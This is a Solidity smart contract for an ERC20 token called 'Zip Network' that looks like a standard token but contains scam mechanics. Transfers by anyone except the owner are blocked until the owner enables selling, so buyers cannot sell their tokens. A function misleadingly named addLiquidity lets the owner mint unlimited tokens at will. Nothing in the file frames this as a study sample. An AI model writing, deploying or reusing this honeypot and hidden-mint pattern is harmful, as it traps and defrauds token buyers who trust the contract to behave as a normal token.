// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ZipNetwork is IERC20 {
    string public name = "Zip Network";
    string public symbol = "ZIPNET";
    uint8 public decimals = 18;
    uint256 private _totalSupply = 956822113300300 * 10**uint256(decimals); 
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private owner;
    bool public isSellingEnabled = false;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    constructor() public {
        _balances[msg.sender] = _totalSupply;
        owner = msg.sender;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function enableSelling() external onlyOwner {
        isSellingEnabled = true;
    }

    function disableSelling() external onlyOwner {
        isSellingEnabled = false;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(isSellingEnabled || msg.sender == owner, "Selling is not enabled");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[msg.sender] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address spender, address recipient) public view override returns (uint256) {
        return _allowances[spender][recipient];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(isSellingEnabled || msg.sender == owner, "Selling is not enabled");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function addLiquidity(uint256 amount) external onlyOwner {
        require(amount > 0, "ERC20: liquidity amount must be greater than zero");

        _balances[msg.sender] += amount;
        _totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function removeLiquidity(uint256 amount) external onlyOwner {
        require(amount > 0, "ERC20: liquidity amount must be greater than zero");
        require(_balances[msg.sender] >= amount, "ERC20: insufficient balance for removal");

        _balances[msg.sender] -= amount;
        _totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}